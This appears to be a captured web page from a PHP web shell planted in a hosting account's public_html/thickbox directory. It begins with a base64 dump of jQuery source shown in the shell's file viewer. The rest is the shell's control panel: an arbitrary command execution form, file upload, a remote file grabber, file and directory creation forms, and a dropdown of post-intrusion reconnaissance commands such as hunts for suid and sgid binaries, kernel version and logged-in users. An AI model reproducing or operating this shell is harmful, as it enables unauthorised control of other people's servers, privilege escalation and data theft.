24oIHNwZWVkICkgJiYgc3BlZWQsCgkJCWR1cmF0aW9uOiBzcGVlZCwKCQkJZWFzaW5nOiBmbiAmJiBlYXNpbmcgfHwgZWFzaW5nICYmIGVhc2luZy5jb25zdHJ1Y3RvciAhPSBGdW5jdGlvbiAmJiBlYXNpbmcKCQl9OwoKCQlvcHQuZHVyYXRpb24gPSAob3B0LmR1cmF0aW9uICYmIG9wdC5kdXJhdGlvbi5jb25zdHJ1Y3RvciA9PSBOdW1iZXIgPyAKCQkJb3B0LmR1cmF0aW9uIDogCgkJCXsgc2xvdzogNjAwLCBmYXN0OiAyMDAgfVtvcHQuZHVyYXRpb25dKSB8fCA0MDA7CgkKCQkvLyBRdWV1ZWluZwoJCW9wdC5vbGQgPSBvcHQuY29tcGxldGU7CgkJb3B0LmNvbXBsZXRlID0gZnVuY3Rpb24oKXsKCQkJaWYgKCBvcHQucXVldWUgIT09IGZhbHNlICkKCQkJCWpRdWVyeSh0aGlzKS5kZXF1ZXVlKCk7CgkJCWlmICggalF1ZXJ5LmlzRnVuY3Rpb24oIG9wdC5vbGQgKSApCgkJCQlvcHQub2xkLmFwcGx5KCB0aGlzICk7CgkJfTsKCQoJCXJldHVybiBvcHQ7Cgl9LAoJCgllYXNpbmc6IHsKCQlsaW5lYXI6IGZ1bmN0aW9uKCBwLCBuLCBmaXJzdE51bSwgZGlmZiApIHsKCQkJcmV0dXJuIGZpcnN0TnVtICsgZGlmZiAqIHA7CgkJfSwKCQlzd2luZzogZnVuY3Rpb24oIHAsIG4sIGZpcnN0TnVtLCBkaWZmICkgewoJCQlyZXR1cm4gKCgtTWF0aC5jb3MocCpNYXRoLlBJKS8yKSArIDAuNSkgKiBkaWZmICsgZmlyc3ROdW07CgkJfQoJfSwKCQoJdGltZXJzOiBbXSwKCXRpbWVySWQ6IG51bGwsCgoJZng6IGZ1bmN0aW9uKCBlbGVtLCBvcHRpb25zLCBwcm9wICl7CgkJdGhpcy5vcHRpb25zID0gb3B0aW9uczsKCQl0aGlzLmVsZW0gPSBlbGVtOwoJCXRoaXMucHJvcCA9IHByb3A7CgoJCWlmICggIW9wdGlvbnMub3JpZyApCgkJCW9wdGlvbnMub3JpZyA9IHt9OwoJfQoKfSk7CgpqUXVlcnkuZngucHJvdG90eXBlID0gewoKCS8vIFNpbXBsZSBmdW5jdGlvbiBmb3Igc2V0dGluZyBhIHN0eWxlIHZhbHVlCgl1cGRhdGU6IGZ1bmN0aW9uKCl7CgkJaWYgKCB0aGlzLm9wdGlvbnMuc3RlcCApCgkJCXRoaXMub3B0aW9ucy5zdGVwLmFwcGx5KCB0aGlzLmVsZW0sIFsgdGhpcy5ub3csIHRoaXMgXSApOwoKCQkoalF1ZXJ5LmZ4LnN0ZXBbdGhpcy5wcm9wXSB8fCBqUXVlcnkuZnguc3RlcC5fZGVmYXVsdCkoIHRoaXMgKTsKCgkJLy8gU2V0IGRpc3BsYXkgcHJvcGVydHkgdG8gYmxvY2sgZm9yIGhlaWdodC93aWR0aCBhbmltYXRpb25zCgkJaWYgKCB0aGlzLnByb3AgPT0gImhlaWdodCIgfHwgdGhpcy5wcm9wID09ICJ3aWR0aCIgKQoJCQl0aGlzLmVsZW0uc3R5bGUuZGlzcGxheSA9ICJibG9jayI7Cgl9LAoKCS8vIEdldCB0aGUgY3VycmVudCBzaXplCgljdXI6IGZ1bmN0aW9uKGZvcmNlKXsKCQlpZiAoIHRoaXMuZWxlbVt0aGlzLnByb3BdICE9IG51bGwgJiYgdGhpcy5lbGVtLnN0eWxlW3RoaXMucHJvcF0gPT0gbnVsbCApCgkJCXJldHVybiB0aGlzLmVsZW1bIHRoaXMucHJvcCBdOwoKCQl2YXIgciA9IHBhcnNlRmxvYXQoalF1ZXJ5LmNzcyh0aGlzLmVsZW0sIHRoaXMucHJvcCwgZm9yY2UpKTsKCQlyZXR1cm4gciAmJiByID4gLTEwMDAwID8gciA6IHBhcnNlRmxvYXQoalF1ZXJ5LmN1ckNTUyh0aGlzLmVsZW0sIHRoaXMucHJvcCkpIHx8IDA7Cgl9LAoKCS8vIFN0YXJ0IGFuIGFuaW1hdGlvbiBmcm9tIG9uZSBudW1iZXIgdG8gYW5vdGhlcgoJY3VzdG9tOiBmdW5jdGlvbihmcm9tLCB0bywgdW5pdCl7CgkJdGhpcy5zdGFydFRpbWUgPSAobmV3IERhdGUoKSkuZ2V0VGltZSgpOwoJCXRoaXMuc3RhcnQgPSBmcm9tOwoJCXRoaXMuZW5kID0gdG87CgkJdGhpcy51bml0ID0gdW5pdCB8fCB0aGlzLnVuaXQgfHwgInB4IjsKCQl0aGlzLm5vdyA9IHRoaXMuc3RhcnQ7CgkJdGhpcy5wb3MgPSB0aGlzLnN0YXRlID0gMDsKCQl0aGlzLnVwZGF0ZSgpOwoKCQl2YXIgc2VsZiA9IHRoaXM7CgkJZnVuY3Rpb24gdChnb3RvRW5kKXsKCQkJcmV0dXJuIHNlbGYuc3RlcChnb3RvRW5kKTsKCQl9CgoJCXQuZWxlbSA9IHRoaXMuZWxlbTsKCgkJalF1ZXJ5LnRpbWVycy5wdXNoKHQpOwoKCQlpZiAoIGpRdWVyeS50aW1lcklkID09IG51bGwgKSB7CgkJCWpRdWVyeS50aW1lcklkID0gc2V0SW50ZXJ2YWwoZnVuY3Rpb24oKXsKCQkJCXZhciB0aW1lcnMgPSBqUXVlcnkudGltZXJzOwoJCQkJCgkJCQlmb3IgKCB2YXIgaSA9IDA7IGkgPCB0aW1lcnMubGVuZ3RoOyBpKysgKQoJCQkJCWlmICggIXRpbWVyc1tpXSgpICkKCQkJCQkJdGltZXJzLnNwbGljZShpLS0sIDEpOwoKCQkJCWlmICggIXRpbWVycy5sZW5ndGggKSB7CgkJCQkJY2xlYXJJbnRlcnZhbCggalF1ZXJ5LnRpbWVySWQgKTsKCQkJCQlqUXVlcnkudGltZXJJZCA9IG51bGw7CgkJCQl9CgkJCX0sIDEzKTsKCQl9Cgl9LAoKCS8vIFNpbXBsZSAnc2hvdycgZnVuY3Rpb24KCXNob3c6IGZ1bmN0aW9uKCl7CgkJLy8gUmVtZW1iZXIgd2hlcmUgd2Ugc3RhcnRlZCwgc28gdGhhdCB3ZSBjYW4gZ28gYmFjayB0byBpdCBsYXRlcgoJCXRoaXMub3B0aW9ucy5vcmlnW3RoaXMucHJvcF0gPSBqUXVlcnkuYXR0ciggdGhpcy5lbGVtLnN0eWxlLCB0aGlzLnByb3AgKTsKCQl0aGlzLm9wdGlvbnMuc2hvdyA9IHRydWU7CgoJCS8vIEJlZ2luIHRoZSBhbmltYXRpb24KCQl0aGlzLmN1c3RvbSgwLCB0aGlzLmN1cigpKTsKCgkJLy8gTWFrZSBzdXJlIHRoYXQgd2Ugc3RhcnQgYXQgYSBzbWFsbCB3aWR0aC9oZWlnaHQgdG8gYXZvaWQgYW55CgkJLy8gZmxhc2ggb2YgY29udGVudAoJCWlmICggdGhpcy5wcm9wID09ICJ3aWR0aCIgfHwgdGhpcy5wcm9wID09ICJoZWlnaHQiICkKCQkJdGhpcy5lbGVtLnN0eWxlW3RoaXMucHJvcF0gPSAiMXB4IjsKCQkKCQkvLyBTdGFydCBieSBzaG93aW5nIHRoZSBlbGVtZW50CgkJalF1ZXJ5KHRoaXMuZWxlbSkuc2hvdygpOwoJfSwKCgkvLyBTaW1wbGUgJ2hpZGUnIGZ1bmN0aW9uCgloaWRlOiBmdW5jdGlvbigpewoJCS8vIFJlbWVtYmVyIHdoZXJlIHdlIHN0YXJ0ZWQsIHNvIHRoYXQgd2UgY2FuIGdvIGJhY2sgdG8gaXQgbGF0ZXIKCQl0aGlzLm9wdGlvbnMub3JpZ1t0aGlzLnByb3BdID0galF1ZXJ5LmF0dHIoIHRoaXMuZWxlbS5zdHlsZSwgdGhpcy5wcm9wICk7CgkJdGhpcy5vcHRpb25zLmhpZGUgPSB0cnVlOwoKCQkvLyBCZWdpbiB0aGUgYW5pbWF0aW9uCgkJdGhpcy5jdXN0b20odGhpcy5jdXIoKSwgMCk7Cgl9LAoKCS8vIEVhY2ggc3RlcCBvZiBhbiBhbmltYXRpb24KCXN0ZXA6IGZ1bmN0aW9uKGdvdG9FbmQpewoJCXZhciB0ID0gKG5ldyBEYXRlKCkpLmdldFRpbWUoKTsKCgkJaWYgKCBnb3RvRW5kIHx8IHQgPiB0aGlzLm9wdGlvbnMuZHVyYXRpb24gKyB0aGlzLnN0YXJ0VGltZSApIHsKCQkJdGhpcy5ub3cgPSB0aGlzLmVuZDsKCQkJdGhpcy5wb3MgPSB0aGlzLnN0YXRlID0gMTsKCQkJdGhpcy51cGRhdGUoKTsKCgkJCXRoaXMub3B0aW9ucy5jdXJBbmltWyB0aGlzLnByb3AgXSA9IHRydWU7CgoJCQl2YXIgZG9uZSA9IHRydWU7CgkJCWZvciAoIHZhciBpIGluIHRoaXMub3B0aW9ucy5jdXJBbmltICkKCQkJCWlmICggdGhpcy5vcHRpb25zLmN1ckFuaW1baV0gIT09IHRydWUgKQoJCQkJCWRvbmUgPSBmYWxzZTsKCgkJCWlmICggZG9uZSApIHsKCQkJCWlmICggdGhpcy5vcHRpb25zLmRpc3BsYXkgIT0gbnVsbCApIHsKCQkJCQkvLyBSZXNldCB0aGUgb3ZlcmZsb3cKCQkJCQl0aGlzLmVsZW0uc3R5bGUub3ZlcmZsb3cgPSB0aGlzLm9wdGlvbnMub3ZlcmZsb3c7CgkJCQkKCQkJCQkvLyBSZXNldCB0aGUgZGlzcGxheQoJCQkJCXRoaXMuZWxlbS5zdHlsZS5kaXNwbGF5ID0gdGhpcy5vcHRpb25zLmRpc3BsYXk7CgkJCQkJaWYgKCBqUXVlcnkuY3NzKHRoaXMuZWxlbSwgImRpc3BsYXkiKSA9PSAibm9uZSIgKQoJCQkJCQl0aGlzLmVsZW0uc3R5bGUuZGlzcGxheSA9ICJibG9jayI7CgkJCQl9CgoJCQkJLy8gSGlkZSB0aGUgZWxlbWVudCBpZiB0aGUgImhpZGUiIG9wZXJhdGlvbiB3YXMgZG9uZQoJCQkJaWYgKCB0aGlzLm9wdGlvbnMuaGlkZSApCgkJCQkJdGhpcy5lbGVtLnN0eWxlLmRpc3BsYXkgPSAibm9uZSI7CgoJCQkJLy8gUmVzZXQgdGhlIHByb3BlcnRpZXMsIGlmIHRoZSBpdGVtIGhhcyBiZWVuIGhpZGRlbiBvciBzaG93bgoJCQkJaWYgKCB0aGlzLm9wdGlvbnMuaGlkZSB8fCB0aGlzLm9wdGlvbnMuc2hvdyApCgkJCQkJZm9yICggdmFyIHAgaW4gdGhpcy5vcHRpb25zLmN1ckFuaW0gKQoJCQkJCQlqUXVlcnkuYXR0cih0aGlzLmVsZW0uc3R5bGUsIHAsIHRoaXMub3B0aW9ucy5vcmlnW3BdKTsKCQkJfQoKCQkJLy8gSWYgYSBjYWxsYmFjayB3YXMgcHJvdmlkZWQsIGV4ZWN1dGUgaXQKCQkJaWYgKCBkb25lICYmIGpRdWVyeS5pc0Z1bmN0aW9uKCB0aGlzLm9wdGlvbnMuY29tcGxldGUgKSApCgkJCQkvLyBFeGVjdXRlIHRoZSBjb21wbGV0ZSBmdW5jdGlvbgoJCQkJdGhpcy5vcHRpb25zLmNvbXBsZXRlLmFwcGx5KCB0aGlzLmVsZW0gKTsKCgkJCXJldHVybiBmYWxzZTsKCQl9IGVsc2UgewoJCQl2YXIgbiA9IHQgLSB0aGlzLnN0YXJ0VGltZTsKCQkJdGhpcy5zdGF0ZSA9IG4gLyB0aGlzLm9wdGlvbnMuZHVyYXRpb247CgoJCQkvLyBQZXJmb3JtIHRoZSBlYXNpbmcgZnVuY3Rpb24sIGRlZmF1bHRzIHRvIHN3aW5nCgkJCXRoaXMucG9zID0galF1ZXJ5LmVhc2luZ1t0aGlzLm9wdGlvbnMuZWFzaW5nIHx8IChqUXVlcnkuZWFzaW5nLnN3aW5nID8gInN3aW5nIiA6ICJsaW5lYXIiKV0odGhpcy5zdGF0ZSwgbiwgMCwgMSwgdGhpcy5vcHRpb25zLmR1cmF0aW9uKTsKCQkJdGhpcy5ub3cgPSB0aGlzLnN0YXJ0ICsgKCh0aGlzLmVuZCAtIHRoaXMuc3RhcnQpICogdGhpcy5wb3MpOwoKCQkJLy8gUGVyZm9ybSB0aGUgbmV4dCBzdGVwIG9mIHRoZSBhbmltYXRpb24KCQkJdGhpcy51cGRhdGUoKTsKCQl9CgoJCXJldHVybiB0cnVlOwoJfQoKfTsKCmpRdWVyeS5meC5zdGVwID0gewoJc2Nyb2xsTGVmdDogZnVuY3Rpb24oZngpewoJCWZ4LmVsZW0uc2Nyb2xsTGVmdCA9IGZ4Lm5vdzsKCX0sCgoJc2Nyb2xsVG9wOiBmdW5jdGlvbihmeCl7CgkJZnguZWxlbS5zY3JvbGxUb3AgPSBmeC5ub3c7Cgl9LAoKCW9wYWNpdHk6IGZ1bmN0aW9uKGZ4KXsKCQlqUXVlcnkuYXR0cihmeC5lbGVtLnN0eWxlLCAib3BhY2l0eSIsIGZ4Lm5vdyk7Cgl9LAoKCV9kZWZhdWx0OiBmdW5jdGlvbihmeCl7CgkJZnguZWxlbS5zdHlsZVsgZngucHJvcCBdID0gZngubm93ICsgZngudW5pdDsKCX0KfTsKLy8gVGhlIE9mZnNldCBNZXRob2QKLy8gT3JpZ2luYWxseSBCeSBCcmFuZG9uIEFhcm9uLCBwYXJ0IG9mIHRoZSBEaW1lbnNpb24gUGx1Z2luCi8vIGh0dHA6Ly9qcXVlcnkuY29tL3BsdWdpbnMvcHJvamVjdC9kaW1lbnNpb25zCmpRdWVyeS5mbi5vZmZzZXQgPSBmdW5jdGlvbigpIHsKCXZhciBsZWZ0ID0gMCwgdG9wID0gMCwgZWxlbSA9IHRoaXNbMF0sIHJlc3VsdHM7CgkKCWlmICggZWxlbSApIHdpdGggKCBqUXVlcnkuYnJvd3NlciApIHsKCQl2YXIgcGFyZW50ICAgICAgID0gZWxlbS5wYXJlbnROb2RlLCAKCQkgICAgb2Zmc2V0Q2hpbGQgID0gZWxlbSwKCQkgICAgb2Zmc2V0UGFyZW50ID0gZWxlbS5vZmZzZXRQYXJlbnQsIAoJCSAgICBkb2MgICAgICAgICAgPSBlbGVtLm93bmVyRG9jdW1lbnQsCgkJICAgIHNhZmFyaTIgICAgICA9IHNhZmFyaSAmJiBwYXJzZUludCh2ZXJzaW9uKSA8IDUyMiwKCQkgICAgZml4ZWQgICAgICAgID0galF1ZXJ5LmNzcyhlbGVtLCAicG9zaXRpb24iKSA9PSAiZml4ZWQiOwoJCgkJLy8gVXNlIGdldEJvdW5kaW5nQ2xpZW50UmVjdCBpZiBhdmFpbGFibGUKCQlpZiAoIGVsZW0uZ2V0Qm91bmRpbmdDbGllbnRSZWN0ICkgewoJCQl2YXIgYm94ID0gZWxlbS5nZXRCb3VuZGluZ0NsaWVudFJlY3QoKTsKCQkKCQkJLy8gQWRkIHRoZSBkb2N1bWVudCBzY3JvbGwgb2Zmc2V0cwoJCQlhZGQoYm94LmxlZnQgKyBNYXRoLm1heChkb2MuZG9jdW1lbnRFbGVtZW50LnNjcm9sbExlZnQsIGRvYy5ib2R5LnNjcm9sbExlZnQpLAoJCQkJYm94LnRvcCAgKyBNYXRoLm1heChkb2MuZG9jdW1lbnRFbGVtZW50LnNjcm9sbFRvcCwgIGRvYy5ib2R5LnNjcm9sbFRvcCkpOwoJCQoJCQkvLyBJRSBhZGRzIHRoZSBIVE1MIGVsZW1lbnQncyBib3JkZXIsIGJ5IGRlZmF1bHQgaXQgaXMgbWVkaXVtIHdoaWNoIGlzIDJweAoJCQkvLyBJRSA2IGFuZCA3IHF1aXJrcyBtb2RlIHRoZSBib3JkZXIgd2lkdGggaXMgb3ZlcndyaXRhYmxlIGJ5IHRoZSBmb2xsb3dpbmcgY3NzIGh0bWwgeyBib3JkZXI6IDA7IH0KCQkJLy8gSUUgNyBzdGFuZGFyZHMgbW9kZSwgdGhlIGJvcmRlciBpcyBhbHdheXMgMnB4CgkJCS8vIFRoaXMgYm9yZGVyL29mZnNldCBpcyB0eXBpY2FsbHkgcmVwcmVzZW50ZWQgYnkgdGhlIGNsaWVudExlZnQgYW5kIGNsaWVudFRvcCBwcm9wZXJ0aWVzCgkJCS8vIEhvd2V2ZXIsIGluIElFNiBhbmQgNyBxdWlya3MgbW9kZSB0aGUgY2xpZW50TGVmdCBhbmQgY2xpZW50VG9wIHByb3BlcnRpZXMgYXJlIG5vdCB1cGRhdGVkIHdoZW4gb3ZlcndyaXRpbmcgaXQgdmlhIENTUwoJCQkvLyBUaGVyZWZvcmUgdGhpcyBtZXRob2Qgd2lsbCBiZSBvZmYgYnkgMnB4IGluIElFIHdoaWxlIGluIHF1aXJrc21vZGUKCQkJYWRkKCAtZG9jLmRvY3VtZW50RWxlbWVudC5jbGllbnRMZWZ0LCAtZG9jLmRvY3VtZW50RWxlbWVudC5jbGllbnRUb3AgKTsKCQoJCS8vIE90aGVyd2lzZSBsb29wIHRocm91Z2ggdGhlIG9mZnNldFBhcmVudHMgYW5kIHBhcmVudE5vZGVzCgkJfSBlbHNlIHsKCQkKCQkJLy8gSW5pdGlhbCBlbGVtZW50IG9mZnNldHMKCQkJYWRkKCBlbGVtLm9mZnNldExlZnQsIGVsZW0ub2Zmc2V0VG9wICk7CgkJCQoJCQkvLyBHZXQgcGFyZW50IG9mZnNldHMKCQkJd2hpbGUgKCBvZmZzZXRQYXJlbnQgKSB7CgkJCQkvLyBBZGQgb2Zmc2V0UGFyZW50IG9mZnNldHMKCQkJCWFkZCggb2Zmc2V0UGFyZW50Lm9mZnNldExlZnQsIG9mZnNldFBhcmVudC5vZmZzZXRUb3AgKTsKCQkJCgkJCQkvLyBNb3ppbGxhIGFuZCBTYWZhcmkgPiAyIGRvZXMgbm90IGluY2x1ZGUgdGhlIGJvcmRlciBvbiBvZmZzZXQgcGFyZW50cwoJCQkJLy8gSG93ZXZlciBNb3ppbGxhIGFkZHMgdGhlIGJvcmRlciBmb3IgdGFibGUgb3IgdGFibGUgY2VsbHMKCQkJCWlmICggbW96aWxsYSAmJiAhL150KGFibGV8ZHxoKSQvaS50ZXN0KG9mZnNldFBhcmVudC50YWdOYW1lKSB8fCBzYWZhcmkgJiYgIXNhZmFyaTIgKQoJCQkJCWJvcmRlciggb2Zmc2V0UGFyZW50ICk7CgkJCQkJCgkJCQkvLyBBZGQgdGhlIGRvY3VtZW50IHNjcm9sbCBvZmZzZXRzIGlmIHBvc2l0aW9uIGlzIGZpeGVkIG9uIGFueSBvZmZzZXRQYXJlbnQKCQkJCWlmICggIWZpeGVkICYmIGpRdWVyeS5jc3Mob2Zmc2V0UGFyZW50LCAicG9zaXRpb24iKSA9PSAiZml4ZWQiICkKCQkJCQlmaXhlZCA9IHRydWU7CgkJCQoJCQkJLy8gU2V0IG9mZnNldENoaWxkIHRvIHByZXZpb3VzIG9mZnNldFBhcmVudCB1bmxlc3MgaXQgaXMgdGhlIGJvZHkgZWxlbWVudAoJCQkJb2Zmc2V0Q2hpbGQgID0gL15ib2R5JC9pLnRlc3Qob2Zmc2V0UGFyZW50LnRhZ05hbWUpID8gb2Zmc2V0Q2hpbGQgOiBvZmZzZXRQYXJlbnQ7CgkJCQkvLyBHZXQgbmV4dCBvZmZzZXRQYXJlbnQKCQkJCW9mZnNldFBhcmVudCA9IG9mZnNldFBhcmVudC5vZmZzZXRQYXJlbnQ7CgkJCX0KCQkKCQkJLy8gR2V0IHBhcmVudCBzY3JvbGwgb2Zmc2V0cwoJCQl3aGlsZSAoIHBhcmVudCAmJiBwYXJlbnQudGFnTmFtZSAmJiAhL15ib2R5fGh0bWwkL2kudGVzdChwYXJlbnQudGFnTmFtZSkgKSB7CgkJCQkvLyBSZW1vdmUgcGFyZW50IHNjcm9sbCBVTkxFU1MgdGhhdCBwYXJlbnQgaXMgaW5saW5lIG9yIGEgdGFibGUgdG8gd29yayBhcm91bmQgT3BlcmEgaW5saW5lL3RhYmxlIHNjcm9sbExlZnQvVG9wIGJ1ZwoJCQkJaWYgKCAhL15pbmxpbmV8dGFibGUuKiQvaS50ZXN0KGpRdWVyeS5jc3MocGFyZW50LCAiZGlzcGxheSIpKSApCgkJCQkJLy8gU3VidHJhY3QgcGFyZW50IHNjcm9sbCBvZmZzZXRzCgkJCQkJYWRkKCAtcGFyZW50LnNjcm9sbExlZnQsIC1wYXJlbnQuc2Nyb2xsVG9wICk7CgkJCQoJCQkJLy8gTW96aWxsYSBkb2VzIG5vdCBhZGQgdGhlIGJvcmRlciBmb3IgYSBwYXJlbnQgdGhhdCBoYXMgb3ZlcmZsb3cgIT0gdmlzaWJsZQoJCQkJaWYgKCBtb3ppbGxhICYmIGpRdWVyeS5jc3MocGFyZW50LCAib3ZlcmZsb3ciKSAhPSAidmlzaWJsZSIgKQoJCQkJCWJvcmRlciggcGFyZW50ICk7CgkJCQoJCQkJLy8gR2V0IG5leHQgcGFyZW50CgkJCQlwYXJlbnQgPSBwYXJlbnQucGFyZW50Tm9kZTsKCQkJfQoJCQoJCQkvLyBTYWZhcmkgPD0gMiBkb3VibGVzIGJvZHkgb2Zmc2V0cyB3aXRoIGEgZml4ZWQgcG9zaXRpb24gZWxlbWVudC9vZmZzZXRQYXJlbnQgb3IgYWJzb2x1dGVseSBwb3NpdGlvbmVkIG9mZnNldENoaWxkCgkJCS8vIE1vemlsbGEgZG91YmxlcyBib2R5IG9mZnNldHMgd2l0aCBhIG5vbi1hYnNvbHV0ZWx5IHBvc2l0aW9uZWQgb2Zmc2V0Q2hpbGQKCQkJaWYgKCAoc2FmYXJpMiAmJiAoZml4ZWQgfHwgalF1ZXJ5LmNzcyhvZmZzZXRDaGlsZCwgInBvc2l0aW9uIikgPT0gImFic29sdXRlIikpIHx8IAoJCQkJKG1vemlsbGEgJiYgalF1ZXJ5LmNzcyhvZmZzZXRDaGlsZCwgInBvc2l0aW9uIikgIT0gImFic29sdXRlIikgKQoJCQkJCWFkZCggLWRvYy5ib2R5Lm9mZnNldExlZnQsIC1kb2MuYm9keS5vZmZzZXRUb3AgKTsKCQkJCgkJCS8vIEFkZCB0aGUgZG9jdW1lbnQgc2Nyb2xsIG9mZnNldHMgaWYgcG9zaXRpb24gaXMgZml4ZWQKCQkJaWYgKCBmaXhlZCApCgkJCQlhZGQoTWF0aC5tYXgoZG9jLmRvY3VtZW50RWxlbWVudC5zY3JvbGxMZWZ0LCBkb2MuYm9keS5zY3JvbGxMZWZ0KSwKCQkJCQlNYXRoLm1heChkb2MuZG9jdW1lbnRFbGVtZW50LnNjcm9sbFRvcCwgIGRvYy5ib2R5LnNjcm9sbFRvcCkpOwoJCX0KCgkJLy8gUmV0dXJuIGFuIG9iamVjdCB3aXRoIHRvcCBhbmQgbGVmdCBwcm9wZXJ0aWVzCgkJcmVzdWx0cyA9IHsgdG9wOiB0b3AsIGxlZnQ6IGxlZnQgfTsKCX0KCglmdW5jdGlvbiBib3JkZXIoZWxlbSkgewoJCWFkZCggalF1ZXJ5LmN1ckNTUyhlbGVtLCAiYm9yZGVyTGVmdFdpZHRoIiwgdHJ1ZSksIGpRdWVyeS5jdXJDU1MoZWxlbSwgImJvcmRlclRvcFdpZHRoIiwgdHJ1ZSkgKTsKCX0KCglmdW5jdGlvbiBhZGQobCwgdCkgewoJCWxlZnQgKz0gcGFyc2VJbnQobCkgfHwgMDsKCQl0b3AgKz0gcGFyc2VJbnQodCkgfHwgMDsKCX0KCglyZXR1cm4gcmVzdWx0czsKfTsKfSkoKTsK</textarea><br><br><b>HEXDUMP:</b><nobr> [<a href=\"?act=f&f=jquery-latest.js&ft=info&fullhexdump=1&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\">Full</a>] [<a href=\"?act=f&f=jquery-latest.js&ft=info&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\">Preview</a>]<br><b>Base64: </b>",
            "<nobr>[<a href=\"?act=f&f=jquery-latest.js&ft=info&base64=1&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\">Encode</a>]&nbsp;</nobr>",
            "<nobr>[<a href=\"?act=f&f=jquery-latest.js&ft=info&base64=2&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\">+chunk</a>]&nbsp;</nobr>",
            "<nobr>[<a href=\"?act=f&f=jquery-latest.js&ft=info&base64=3&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\">+chunk+quotes</a>]&nbsp;</nobr>",
            "<nobr>[<a href=\"?act=f&f=jquery-latest.js&ft=info&base64=4&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\">Decode</a>]&nbsp;</nobr>",
            "</td></tr></table><a bookmark=\"minipanel\"><br><TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"1\" width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1>",
            "<tr><td width=\"100%\" height=\"1\" valign=\"top\"><center><form action=\"?\"><input type=hidden name=act value=\"cmd\"><br/><b>CMD:</b> <input type=hidden name=\"d\" value=\"/home/chsclair/public_html/thickbox/\"><input type=\"text\" name=\"cmd\" size=\"50\" value=\"\"><input type=hidden name=\"cmd_txt\" value=\"1\">&nbsp;<input type=submit name=submit value=\"Execute\"></form></td></tr></TABLE>",
            "<br>",
            "<TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"1\" width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1>",
            "<tr>",
            " <td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: <a href=\"?act=search&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\"><b>Search</b></a> ::</b><form method=\"POST\"><input type=hidden name=act value=\"search\"><input type=hidden name=\"d\" value=\"/home/chsclair/public_html/thickbox/\"><input type=\"text\" name=\"search_name\" size=\"29\" value=\"(.*)\">&nbsp;<input type=\"checkbox\" name=\"search_name_regexp\" value=\"1\"  checked> - regexp&nbsp;<input type=submit name=submit value=\"Search\"></form></center></p></td>",
            " <td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: <a href=\"?act=upload&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\"><b>Upload</b></a> ::</b><form method=\"POST\" ENCTYPE=\"multipart/form-data\"><input type=hidden name=act value=\"upload\"><input type=\"file\" name=\"uploadfile\"><input type=hidden name=\"miniform\" value=\"1\">&nbsp;<input type=submit name=submit value=\"Upload\"><br><font color=green>[ ok ]</font></form></center></td>",
            "</tr>",
            "</table>",
            "<br><TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"1\" width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: Remote File Grabber ::</b><br/><br/><form action=\"?grab=true\"   method=\"post\">File Url:<input name=\"from\"> New File Name: <input name=\"to\"> <input type=\"submit\" value=\"Grab!\"></center></td></tr></table>",
            "<br><TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"1\" width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: Make Dir ::<p><form action=\"?\"><input type=hidden name=act value=\"mkdir\"><input type=hidden name=\"d\" value=\"/home/chsclair/public_html/thickbox/\"><input type=\"text\" name=\"mkdir\" size=\"50\" value=\"/home/chsclair/public_html/thickbox/\">&nbsp;<input type=submit value=\"Create\"><br><font color=green>[ ok ]</font></form></center></td><td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: Make File ::</b><form method=\"POST\"><input type=hidden name=act value=\"mkfile\"><input type=hidden name=\"d\" value=\"/home/chsclair/public_html/thickbox/\"><input type=\"text\" name=\"mkfile\" size=\"50\" value=\"/home/chsclair/public_html/thickbox/\"><input type=hidden name=\"ft\" value=\"edit\">&nbsp;<input type=submit value=\"Create\"><br><font color=green>[ ok ]</font></form></center></td></tr></table>",
            "<br>",
            "<TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"116\" width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1>",
            "<tr>",
            "  <td width=\"50%\" height=\"83\" valign=\"top\"><center>",
            "    <div align=\"center\"><br/><b>:: Useful Commands ::</b>",
            "    </div>",
            "    <form action=\"?\">",
            "      <div align=\"center\">",
            "        <input type=hidden name=act value=\"cmd\">",
            "        <input type=hidden name=\"d\" value=\"/home/chsclair/public_html/thickbox/\">",
            " <SELECT NAME=\"cmd\">",
            "           <OPTION VALUE=\"tar -cvf NEWTAR!!.tar -c /home/chsclair/public_html/td-admin/modules/gallery_management/images",
            "\">Tar your current directory. (Only works if your dir. is writable)",
            "           <OPTION VALUE=\"pwd\">List your current directory",
            "           <OPTION VALUE=\"ls -lia\">List you current directory's files, folders, & permissions",
            "           <OPTION VALUE=\"find / -type f -perm -04000 -ls\">find suid files",
            "           <OPTION VALUE=\"find . -type f -perm -04000 -ls\">find suid files in current dir",
            "           <OPTION VALUE=\"find / -type f -perm -02000 -ls\">find sgid files",
            "           <OPTION VALUE=\"find . -type f -perm -02000 -ls\">find sgid files in current dir",
            "           <OPTION VALUE=\"uname -a\">Kernel version",
            "           <OPTION VALUE=\"w\">Logged in users",
            "           <OPTION VALUE=\"lastlog\">Last users to connect",
            "           <OPTION VALUE=\"find /bin /usr/bin /usr/local/bin /sbin /usr/sbin /usr/local/sbin -perm -4000 2> /dev/null\">Suid bins",
